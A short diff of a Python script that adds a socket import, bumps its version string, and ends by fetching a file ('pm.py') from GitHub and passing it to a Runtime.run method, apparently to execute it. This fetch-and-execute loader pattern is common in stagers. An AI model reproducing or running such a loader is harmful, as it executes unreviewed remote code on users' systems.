@@ -2,6 +2,7 @@ import urllib.request
 import json
 import base64
 import uuid
+import socket
 
 class Runtime:
   @classmethod
@@ -61,5 +62,5 @@ class GitHub:
       except Exception as e:
         return cls.getFileFromRAW(path)
 
-print("ver 0.98d")
+print("ver 0.98e")
 Runtime.run(GitHub.getFile("db0bc|pm|pm.py"))
